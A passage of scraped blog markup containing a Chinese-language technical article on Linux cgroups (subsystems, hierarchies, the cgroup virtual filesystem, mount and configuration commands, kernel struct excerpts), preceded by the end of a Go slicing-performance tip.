&lt;p&gt;在已有切片的基础上再进行切片，不会创建新的底层数组，也就是两个切片引用了同一块内存。那么存在一种情况，原切片存在大量数据，新切片只是使用了一小段，但底层数组仍占据了大量的空间，得不到释放。&lt;/p&gt;
&lt;p&gt;对于这种情况可以使用copy替代re-slice。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// b = a[start:end]
b = make([]int, len)
copy(b, a[start:end])
&lt;/code&gt;&lt;/pre&gt;
">【go】高性能编程</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cgroup/"" data-c="
          &lt;h2 id=&#34;基本原理&#34;&gt;基本原理&lt;/h2&gt;
&lt;p&gt;cgroups是Linux内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。通过cgroup可以将定额的资源分配给特定的一组进程。&lt;/p&gt;
&lt;p&gt;默认情况下，编译内核时打开cgroup的系统中所有进程位于同一个cgroup，就是根，这个cgroup享有所有的系统资源。&lt;/p&gt;
&lt;p&gt;可以通过cgroup文件系统建立一个新的cgroup，然后配置这个新的cgroup，配置的内容包括为其分配进程、分配资源等。这个创建和分配的所有过程都是cgroup文件系统通过&lt;code&gt;shell echo&lt;/code&gt;写进文件完成的。&lt;/p&gt;
&lt;p&gt;cgroup本身时分层的，一个根层下面就像一棵树一样可以分很多层。每一层的cgroup文件系统目录下都有该层对应的资源配置文件。这些可以配置的资源都是cgroup子系统。&lt;/p&gt;
&lt;p&gt;子系统(subsystem)实际上是cgroup对进程组进行资源控制的具体体现。子系统具有多种类型，每个类型的子系统都代表一种系统资源，比如&lt;code&gt;CPU、memory&lt;/code&gt;等。当创建一个cgroup实例时，必须至少指定一种子系统。也就是说，这个新建的进程组在访问子系统对应的系统资源时就有了一些限制。具体的限制项与子系统的类型有关。&lt;/p&gt;
&lt;p&gt;cgroup中进程组的层级关系与Linux中进程的层级关系比较类似。在Linux操作系统中，一个进程通过&lt;code&gt;fork()&lt;/code&gt;系统调用创建了一个子进程，这两个进程之间存在父子这样的等级关系，并且子进程可以继承父进程的一些资源。系统中所有的进程形成一个树形的等级关系，每个进程都唯一的位于进程树中的某一个位置。&lt;/p&gt;
&lt;p&gt;对于cgroup来说，cgroup实例之间也是有具体级别关系的，但是它们层级关系是为了更细粒度的对进程组进行资源控制。同时，子cgroup会继承父cgroup的对资源的控制属性。&lt;/p&gt;
&lt;h3 id=&#34;子系统与层级关系&#34;&gt;子系统与层级关系&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454770921.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;一个子系统就是一个资源控制器。cgroup九个子系统分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cpu&lt;/code&gt; 子系统，主要限制进程的 cpu 使用率。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuacct&lt;/code&gt; 子系统，可以统计 cgroups 中的进程的 cpu 使用报告。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuset&lt;/code&gt; 子系统，可以为 cgroups 中的进程分配单独的 cpu 节点或者内存节点。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;memory&lt;/code&gt; 子系统，可以限制进程的 memory 使用量。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blkio&lt;/code&gt; 子系统，可以限制进程的块设备 io。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;devices&lt;/code&gt; 子系统，可以控制进程能够访问某些设备。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net_cls&lt;/code&gt; 子系统，可以标记 cgroups 中进程的网络数据包，然后可以使用tc 模块（traffic control）对数据包进行控制。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;freezer&lt;/code&gt; 子系统，可以挂起或者恢复 cgroups 中的进程。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ns&lt;/code&gt; 子系统，可以使不同 cgroups 下面的进程使用不同的 namespace。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;hierarchy层级结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内核使用 cgroup 结构体来表示一个 control group 对某一个或者某几个 cgroups 子系统的资源限制。&lt;/p&gt;
&lt;p&gt;hierarchy的功能是把一组cgroup串成一个树状的形状，一棵这样的树是一个hierarchy，通过这种树状结构，cgroup可以做到继承。&lt;em&gt;例如系统对一组定时的任务进程通过cgroup1限制了CPU的使用率，然后其中有一个定时任务需要限制磁盘IO，就可以创建cgroup2，使其继承与cgroup1，这样cgroup2继承了cgroup1对CPU使用率的限制，同时也限制了磁盘IO。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;一个hierarchy可以attach一个或多个子系统，当前层级结构可以对其 attach 的子系统进行资源的限制。每一个子系统只能被attach到一个hierarchy中。一个进程也可以属于多个cgroup，但是这些cgroup必须属于不同的hierarchy。&lt;/p&gt;
&lt;p&gt;当建立第一个cgroup时，系统会把所有的进程都放进去，对应树形结构的树根，例如&lt;code&gt;cat /sys/fs/cgroup/cpu/task&lt;/code&gt;会输出所有进程的pid。&lt;/p&gt;
&lt;p&gt;如果在下级cgroup，例如/cgroup/test的&lt;code&gt;task&lt;/code&gt;中将一个进程的PID &lt;code&gt;echo&lt;/code&gt;到文件，就会发现这个进程并没有从上层cgroup的&lt;code&gt;task&lt;/code&gt;列表中消失 ，而是同时出现在了下层test cgroup的&lt;code&gt;task&lt;/code&gt;文件中，这就表示该进程现在归test cgroup控制。但由于test cgroup是下层 cgroup ，所以进程依然存在于上cgroup，而同层的 cgroup 之间却不能含有相同的进程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下图时一个cgroup结构图，包含两个层级，即第一层级&lt;code&gt;cpu_mem&lt;/code&gt;和第二层级&lt;code&gt;cpuset_net&lt;/code&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454793175.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;系统中第一个被创建的cgroup被称为&lt;code&gt;root cgroup&lt;/code&gt;，该cgroup的成员包含系统中所有的进程。其下又包含从&lt;code&gt;cgroup1&lt;/code&gt;和&lt;code&gt;cgroup2&lt;/code&gt;两个cgroup，位于第二层级&lt;code&gt;cpuset_net&lt;/code&gt;中。&lt;/li&gt;
&lt;li&gt;一个子系统只能位于一个层级中。在图中，&lt;code&gt;cpu&lt;/code&gt;子系统位于第一层级&lt;code&gt;cpu_mem&lt;/code&gt;中，那么这个子系统将不能再位于第二层级中。不过第二层级会继承第一层级的cpu子系统。&lt;/li&gt;
&lt;li&gt;每个层级中可以关联多个子系统。第一层级关联了&lt;code&gt;cpu&lt;/code&gt;和&lt;code&gt;memory&lt;/code&gt;子系统。&lt;/li&gt;
&lt;li&gt;一个进程可以位于不同层级的cgroup中。由于&lt;code&gt;root cgroup&lt;/code&gt;包含了系统中所有的进程，因此&lt;code&gt;cgroup2&lt;/code&gt;中的进程P也位于&lt;code&gt;root cgroup&lt;/code&gt;中。从资源控制角度来说，进程P所在的进程组在访问&lt;code&gt;cpu、memory&lt;/code&gt;和&lt;code&gt;net&lt;/code&gt;时会受到资源限制。&lt;/li&gt;
&lt;li&gt;一个进程创建了子进程后，该子进程默认为父进程所在的cgroup的成员。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在创建了 cgroups 层级结构中的节点（cgroup 结构体）之后，可以把进程加入到某一个节点的控制任务列表中，一个节点的控制列表中的所有进程都会受到当前节点的资源限制。同时某一个进程也可以被加入到不同的 cgroups 层级结构的节点中，因为不同的 cgroups 层级结构可以负责不同的系统资源。所以说进程和 cgroup 结构体是一个多对多的关系。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621991742733.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上面这个图从整体结构上描述了进程与 cgroups 之间的关系。最下面的&lt;code&gt;P&lt;/code&gt;代表一个进程。每一个进程的描述符中有一个指针指向了一个辅助数据结构&lt;code&gt;css_set(cgroups subsystem set)&lt;/code&gt;。 指向某一个&lt;code&gt;css_set&lt;/code&gt;的进程会被加入到当前&lt;code&gt;css_set&lt;/code&gt;的进程链表中。一个进程只能隶属于一个&lt;code&gt;css_set&lt;/code&gt;，一个&lt;code&gt;css_set&lt;/code&gt;可以包含多个进程，隶属于同一&lt;code&gt;css_set&lt;/code&gt;的进程受到同一个&lt;code&gt;css_set&lt;/code&gt;所关联的资源限制。&lt;/p&gt;
&lt;p&gt;上图中的&lt;code&gt;&amp;quot;M×N Linkage&amp;quot;&lt;/code&gt;说明的是&lt;code&gt;css_set&lt;/code&gt;通过辅助数据结构可以与 cgroups 节点进行多对多的关联。但是 cgroups 的实现不允许&lt;code&gt;css_set&lt;/code&gt;同时关联同一个cgroups层级结构下多个节点。 这是因为 cgroups 对同一种资源不允许有多个限制配置。&lt;/p&gt;
&lt;p&gt;一个&lt;code&gt;css_set&lt;/code&gt;关联多个 cgroups 层级结构的节点时，表明需要对当前&lt;code&gt;css_set&lt;/code&gt;下的进程进行多种资源的控制。而一个 cgroups 节点关联多个&lt;code&gt;css_set&lt;/code&gt;时，表明多个&lt;code&gt;css_set&lt;/code&gt;下的进程列表受到同一份资源的相同限制。&lt;/p&gt;
&lt;h3 id=&#34;vfs文件系统&#34;&gt;VFS文件系统&lt;/h3&gt;
&lt;p&gt;cgroup需要提供接口给用户态，有两个选择，一个是提供系统调用，另一个是提供虚拟文件系统。cgroup选择个后者，它提供了一种名为cgroup的文件系统。&lt;/p&gt;
&lt;p&gt;VFS(Virtual File System) 是一个内核抽象层，能够隐藏具体文件系统的实现细节，从而给用户态进程提供一套统一的 API 接口。&lt;/p&gt;
&lt;p&gt;VFS 使用了一种通用文件系统的设计，具体的文件系统只要实现了 VFS 的设计接口，就能够注册到 VFS 中，从而使内核可以读写这种文件系统。&lt;/p&gt;
&lt;p&gt;这很像面向对象设计中的抽象类与子类之间的关系，抽象类负责对外接口的设计，子类负责具体的实现。其实，VFS本身就是用 c 语言实现的一套面向对象的接口。&lt;/p&gt;
&lt;p&gt;cgroup通过VFS向用户层提供接口，用户通过挂载，创建目录，读写文件的方式与cgroup交互。&lt;/p&gt;
&lt;h4 id=&#34;通用文件模型&#34;&gt;&lt;strong&gt;通用文件模型&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;VFS 通用文件模型中包含以下四种元数据结构：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;超级块对象&lt;/strong&gt;(superblock object)，用于存放已经注册的文件系统的信息。比如ext2，ext3等这些基础的磁盘文件系统，还有用于读写socket的socket文件系统，以及当前的用于读写cgroups配置信息的 cgroups 文件系统等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;索引节点对象&lt;/strong&gt;(inode object)，用于存放具体文件的信息。对于一般的磁盘文件系统而言，inode 节点中一般会存放文件在硬盘中的存储块等信息；对于socket文件系统，inode会存放socket的相关属性，而对于cgroups这样的特殊文件系统，inode会存放与 cgroup 节点相关的属性信息。这里面比较重要的一个部分是一个叫做 inode_operations 的结构体，这个结构体定义了在具体文件系统中创建文件，删除文件等的具体实现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件对象&lt;/strong&gt;(file object)，一个文件对象表示进程内打开的一个文件，文件对象是存放在进程的文件描述符表里面的。同样这个文件中比较重要的部分是一个叫 file_operations 的结构体，这个结构体描述了具体的文件系统的读写实现。当进程在某一个文件描述符上调用读写操作时，实际调用的是 file_operations 中定义的方法。 对于普通的磁盘文件系统，file_operations 中定义的就是普通的块设备读写操作；对于socket文件系统，file_operations 中定义的就是 socket 对应的 send/recv 等操作；而对于cgroups这样的特殊文件系统，file_operations 中定义的就是操作 cgroup 结构体等具体的实现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目录项对象&lt;/strong&gt;(dentry object)，在每个文件系统中，内核在查找某一个路径中的文件时，会为内核路径上的每一个分量都生成一个目录项对象，通过目录项对象能够找到对应的 inode 对象，目录项对象一般会被缓存，从而提高内核查找速度。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;cgroup文件系统的实现&#34;&gt;&lt;strong&gt;cgroup文件系统的实现&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;基于VFS实现的文件系统，都必须实现VFS通用文件模型定义的这些对象，并实现这些对象定义的部分函数。cgroup文件系统也不例外。&lt;/p&gt;
&lt;p&gt;cgroup文件系统类型的结构体：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct file_system_type cgroup_fs_type = {
        .name = &amp;quot;cgroup&amp;quot;,
        .mount = cgroup_mount,
        .kill_sb = cgroup_kill_sb,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里面两个函数分别代表安装和卸载某一个 cgroup 文件系统所需要执行的函数。每次把某一个 cgroups 子系统安装到某一个装载点的时候，cgroup_mount 方法就会被调用，这个方法会生成一个 cgroups_root（cgroups层级结构的根）并封装成超级快对象。&lt;/p&gt;
&lt;p&gt;cgroup超级块对象定义的操作：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct super_operations cgroup_ops = {
        .statfs = simple_statfs,
        .drop_inode = generic_delete_inode,
        .show_options = cgroup_show_options,
        .remount_fs = cgroup_remount,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里只有部分函数的实现，这是因为对于特定的文件系统而言，所支持的操作可能仅是 super_operations 中所定义操作的一个子集，比如说对于块设备上的文件对象，肯定是支持类似 fseek 的查找某个位置的操作，但是对于 socket 或者 cgroups 这样特殊的文件系统，就不支持这样的操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;inode&lt;/code&gt;对象和&lt;code&gt;file&lt;/code&gt;对象的定义的特殊实现函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct inode_operations cgroup_dir_inode_operations = {
        .lookup = cgroup_lookup,
        .mkdir = cgroup_mkdir,
        .rmdir = cgroup_rmdir,
        .rename = cgroup_rename,
};
static const struct file_operations cgroup_file_operations = {
        .read = cgroup_file_read,
        .write = cgroup_file_write,
        .llseek = generic_file_llseek,
        .open = cgroup_file_open,
        .release = cgroup_file_release,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从这些代码可以推断出，cgroups 通过实现 VFS 的通用文件系统模型，把维护 cgroups 层级结构的细节，隐藏在 cgroups 文件系统的这些实现函数中。&lt;/p&gt;
&lt;p&gt;从另一个方面说，用户在用户态对 cgroups 文件系统的操作，通过 VFS 转化为对 cgroups 层级结构的维护。通过这样的方式，内核把 cgroups 的功能暴露给了用户态的进程。&lt;/p&gt;
&lt;h2 id=&#34;简单用法及说明&#34;&gt;简单用法及说明&lt;/h2&gt;
&lt;h3 id=&#34;挂载cgroup文件系统&#34;&gt;挂载cgroup文件系统&lt;/h3&gt;
&lt;p&gt;和所有的文件系统一样，cgroup文件系统需要先挂载，通过&lt;code&gt;mount&lt;/code&gt;命令挂载 cgroups 文件系统，格式为:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mount -t cgroup -o subsystems name /cgroup/name&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;code&gt;-t cgroup&lt;/code&gt;指定文件系统类型为cgroup类型，&lt;code&gt;-o subsystems&lt;/code&gt; 表示需要关联的cgroups子系统，可以用逗号隔开，表示同时挂载多个子系统，&lt;code&gt;name&lt;/code&gt;表示实例的名称，&lt;code&gt;/cgroup/name&lt;/code&gt; 表示挂载点，这条命令同时在内核中创建了一个cgroups 层级结构。(目前大多操作系统启动时已经默认挂载&lt;code&gt;/sys/fs/cgroup&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;比如挂载 &lt;code&gt;cpuset, cpu, cpuacct, memory&lt;/code&gt; 4个&lt;code&gt;subsystem&lt;/code&gt;到&lt;code&gt;/cgroup/cpu_and_mem&lt;/code&gt; 目录下，就可以使用 &lt;code&gt;mount -t cgroup -o remount,cpu,cpuset,memory cpu_and_mem /cgroup/cpu_and_mem&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;cgroup文件系统的一个特点是用户可以同时挂载多个cgroup文件系统，但是要保证每个cgroup文件系统用到的子系统没有重叠。也就是说，如果已经有一个cgroup文件系统的挂载包含了某一个子系统，其它cgroup文件系统就不能包含这个子系统。&lt;/p&gt;
&lt;p&gt;ubuntu和centos的做法是每个cgroup文件系统的挂载基本只包含一个子系统。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/
total 0
drwxr-xr-x. 2 root root  0 May 25 04:19 blkio
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpu -&amp;gt; cpu,cpuacct
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpuacct -&amp;gt; cpu,cpuacct
drwxr-xr-x. 3 root root  0 May 25 04:19 cpu,cpuacct
drwxr-xr-x. 2 root root  0 May 25 04:19 cpuset
drwxr-xr-x. 2 root root  0 May 25 04:19 devices
drwxr-xr-x. 2 root root  0 May 25 04:19 freezer
drwxr-xr-x. 2 root root  0 May 25 04:19 hugetlb
drwxr-xr-x. 2 root root  0 May 25 04:19 memory
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_cls -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 net_cls,net_prio
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_prio -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 perf_event
drwxr-xr-x. 2 root root  0 May 25 04:19 pids
drwxr-xr-x. 4 root root  0 May 25 04:19 systemd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以CPU子系统所在的cgroup文件系统为例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/cpu/
total 0
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.clone_children
--w--w--w-. 1 root root 0 May 25 04:19 cgroup.event_control
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.procs
-r--r--r--. 1 root root 0 May 25 04:19 cgroup.sane_behavior
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.stat
-rw-r--r--. 1 root root 0 May 25 04:19 cpuacct.usage
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.usage_percpu
drwxr-xr-x. 3 root root 0 May 25 04:52 cpu_c1
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_quota_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_runtime_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.shares
-r--r--r--. 1 root root 0 May 25 04:19 cpu.stat
-rw-r--r--. 1 root root 0 May 25 04:19 notify_on_release
-rw-r--r--. 1 root root 0 May 25 04:19 release_agent
-rw-r--r--. 1 root root 0 May 25 04:19 tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;总共包含的文件可以分为三类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目录。再cgroup文件系统中目录对应一个具体的cgroup。&lt;/li&gt;
&lt;li&gt;通用文件。以&lt;code&gt;cgroup.&lt;/code&gt;为前缀的文件和三个无前缀的文件&lt;code&gt;notify_on_release, release_agent, tasks&lt;/code&gt;，这些通用文件再每个cgroup文件系统都会出现，无论指定的是哪个子系统。&lt;/li&gt;
&lt;li&gt;子系统专有文件。这些文件是配置子系统的接口，子系统不同，文件也不同。例如上面的以&lt;code&gt;cpu.&lt;/code&gt;为前缀的文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在cgroup文件系统中，创建(删除)一个目录就是创建(删除)一个cgroup，创建完目录后，会自动产生很多文件，在cgroup文件系统的根目录下(在上面的例子中是&lt;code&gt;/sys/fs/cgroup/cpu&lt;/code&gt;)的大多数文件都会出现在cgroup文件系统的下级目录中，除了少数在代码实现中标记为只在根目录中出现的文件，例如&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;各个子系统的通用文件：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;cgroup.procs&lt;/code&gt;&lt;br&gt;
此文件的内容和cgroup中所有进程的进程号关联。这里的进程号实际上是线程组号(thread group ID)。向这个文件写入一个线程组号，就会把整个线程组中的线程都加入此文件所属的cgroup。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.clone_chidren&lt;/code&gt;&lt;br&gt;
这个文件和一个标志关联，而此标志只被&lt;code&gt;cpuset&lt;/code&gt;子系统使用。当此标志为1时，创建新的有关&lt;code&gt;cpuset&lt;/code&gt;的cgroup时，子cgroup从父cgroup中复制&lt;code&gt;cpuset&lt;/code&gt;配置。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;&lt;br&gt;
显示cgroup文件系统的&lt;code&gt;sane_behavior&lt;/code&gt;的状态。随着内核控制组子系统的开发，一些旧的做法不再合适，但是为了兼容旧的应用又不好完全清除。于是开发者提供了一个选项&lt;code&gt;__DEVEL__sane_behavior&lt;/code&gt;，供挂载时使用。如果有这个挂载选项，老旧的不合适的代码逻辑就不会出现，&lt;code&gt;tasks、notify_on_release、release_agent&lt;/code&gt; 这三个文件也不会出现。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tasks&lt;/code&gt;&lt;br&gt;
旧机制，尽量不要使用。此文件关联控制组中所有线程的线程号。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;notify_on_release&lt;/code&gt;&lt;br&gt;
旧机制，尽量不要使用。通过它来存取 &lt;code&gt;notify_on_release&lt;/code&gt; 标志。当此标志为 1 时，在 cgroup退出时，内核要通知用户态。所谓退出是指此 cgroup 不再有进程，也不再有子 cgroup。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;release_agent&lt;/code&gt;&lt;br&gt;
旧机制，尽量不要使用。此文件中存有一个路径，当内核需要通知用户态 cgroup 退出事件时，内核运行此路径所指的可执行文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;子节点和进程&#34;&gt;子节点和进程&lt;/h3&gt;
&lt;p&gt;挂载某一个cgroups子系统到挂载点之后，就可以通过在挂载点下面建立文件夹创建cgroups层级结构中的节点，当创建完文件夹后，会自动在其中创建相关的配置文件。创建目录的动作也就是创建了下个层级的一个分支，还可以在这个目录中继续创建目录，形成第三层级。&lt;/p&gt;
&lt;p&gt;然后在相应的配置文件中写上具体的配置。例如在&lt;code&gt;cpu.shares&lt;/code&gt;中写入整数值可以控制该cgroup获得的时间片。&lt;/p&gt;
&lt;p&gt;创建并配置完节点后，将进程的pid写入子节点下面的task文件中即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 在cpu层级创建一个新的cgroup节点
# 命名为cpu_c1
mkdir /cgroup/cpu/cpu_c1

# 设置`cpu.shares`文件
# 将cpu_c1目录下的cpu.shares文件值设为2048，这样在系统出现cpu争抢时
# 属于cpu_c1这个cgroup的进程占用资源是其它进程的2倍。
echo 2048 &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/cpu.shares

# 将进程加入到`cpu_c1`这个cgroup节点。
echo pid &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看已经挂载的cgroup&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;mount -t cgroup
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuacct,cpu)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,blkio)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,net_prio,net_cls)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,perf_event)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,freezer)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,hugetlb)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuset)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,memory)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;源码分析&#34;&gt;源码分析&lt;/h2&gt;
&lt;p&gt;cgroup分为三个部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;描述子系统(subsys)和cgroup等对象、和它们的依附关系等数据结构；&lt;/li&gt;
&lt;li&gt;提供给用户空间的文件系统接口；&lt;/li&gt;
&lt;li&gt;各子系统。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数据结构&#34;&gt;数据结构&lt;/h3&gt;
&lt;h4 id=&#34;任务task&#34;&gt;任务(task)&lt;/h4&gt;
&lt;p&gt;task对应linux中的进程，task和cgroup实例之间是多对多的关系，cgroup实例和子系统是一对多的关系，task和子系统也是多对多的关系(task可以依附多个cgroup，一个cgroup可能依附了多个子系统)。&lt;/p&gt;
&lt;p&gt;要描述这些关系不容易，如果task通过各cgroup来引用各子系统再从subsys获取到资源限制，这比较低效。&lt;strong&gt;内核用&lt;code&gt;css_set&lt;/code&gt;来包含多个子系统的组合，每个task对应若干&lt;code&gt;css_set&lt;/code&gt;结构体，即通过&lt;code&gt;css_set&lt;/code&gt;知道它受哪些限制&lt;/strong&gt;，加快了访问速度，而且子系统组合是有限的，减少了内核数据结构的复杂度。&lt;/p&gt;
&lt;p&gt;实际上css_set就是若干&lt;code&gt;cgroup_subsys_state&lt;/code&gt;实例的集合，而每个&lt;code&gt;cgroup_subsys_state&lt;/code&gt;实例描述了一个子系统。&lt;/p&gt;
&lt;h5 id=&#34;css_set&#34;&gt;css_set&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;css_set&lt;/code&gt;结构体表示一种资源限制的集合(比如&lt;code&gt;cpu 20% mem 40%&lt;/code&gt;和&lt;code&gt;cpu 30% mem 20%&lt;/code&gt;是不同的资源限制，用不同的css_set)并且连接进程和subsys。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct css_set { 
… 
    // 关联此css_set的进程链表
    struct list_head tasks;
    // 关联的cgroup链表，通过cg_cgroup_link结构体来连接
    struct list_head cgrp_links; 
    // cg_links用于链接所有关于此css_set的cgroup，cgroup并不是直接连接到此list_head，而是通过cg_cgroup_link结构体连接。

    // 一个数组，每个元素指向一个cgroup_subsys_state，这个数组元素与subsystem的个数一一对应
    struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];
… 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;task_struct&#34;&gt;task_struct：&lt;/h5&gt;
&lt;p&gt;进程结构体&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/sched.h 
struct task_struct { 
… 
#ifdef CONFIG_CGROUPS 
    // 该进程关联的css_set
    struct css_set __rcu *cgroups; 
    // 链接到关联css_set的task链表
    struct list_head cg_list; 
#endif 
… 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454850635.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;task可以通过task_struct-&amp;gt;css_set-&amp;gt;cgroup_subsys_state找到该task所受子系统的限制。&lt;/p&gt;
&lt;h4 id=&#34;cgroup&#34;&gt;cgroup&lt;/h4&gt;
&lt;p&gt;在结构体&lt;code&gt;cgroup&lt;/code&gt;中，一个&lt;code&gt;cgroup&lt;/code&gt;实例就是cgroup文件系统中的一个cgroup文件，&lt;code&gt;cgroup&lt;/code&gt;结构体主要作用是关联&lt;code&gt;css_set&lt;/code&gt;和&lt;code&gt;subsys&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;对于&lt;code&gt;task&lt;/code&gt;到&lt;code&gt;cgroup&lt;/code&gt;不需要直接连接，可以通过&lt;code&gt;css_set&lt;/code&gt;引用到&lt;code&gt;cgroup&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
// 子节点cgroup
struct cgroup { 
    … 
    unsigned long flags;	// 用于标识当前cgroup的状态
